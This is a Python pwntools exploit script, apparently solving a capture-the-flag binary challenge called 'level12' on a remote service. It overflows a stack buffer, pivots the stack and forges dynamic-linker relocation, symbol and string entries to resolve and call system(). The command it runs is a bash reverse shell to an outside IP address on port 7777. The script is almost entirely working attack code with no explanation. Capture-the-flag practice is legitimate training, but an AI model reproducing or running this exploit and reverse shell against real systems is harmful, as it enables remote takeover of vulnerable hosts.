from pwn import *
context.log_level = "debug"

r = remote("pwn.sixstars.team", 22012)
#r = process("./level12")
elf = ELF("./level12")
#print r.pid
#pause()

JMP_REL =   0x080482B0
DYNSYM  =   0x080481CC
DYNSTR  =   0x0804822C

leave   =   0x08048455
stack   =   0x0804a800
read    =   0x08048300

plt0    =   0x0804831B
rel_off =   0x804a820 - JMP_REL

r_info  =   (0x804a82c - DYNSYM)*0x10 + 7

st_name =   0x804a83c - DYNSTR
binsh   =   0x804a843

sh = 'a'*0x28 + p32(stack)
sh += p32(read) + p32(leave) + p32(0) + p32(stack) + p32(0xc0)

data = p32(0)
data += p32(plt0) + p32(rel_off) + p32(0) + p32(binsh)

data += 'a'*(0x20 - len(data))      

# .rel.plt 0x804a820
data += p32(0x804a010)      # r_offset  =  got['alarm']
data += p32(r_info)         # r_info
data += p32(0)

# .dynsym 0x804a82c
data += p32(st_name)
data += p32(0) + p32(0) + p32(0x12)

# .dynstr 0x804a83c
data += "system\x00"

# binsh 0x804a843
data += 'bash -c "bash -i >& /dev/tcp/138.68.0.234/7777 0>&1"'
data += '\x00'

r.send(sh+data+'a'*(0xc0-len(data)))
r.interactive()
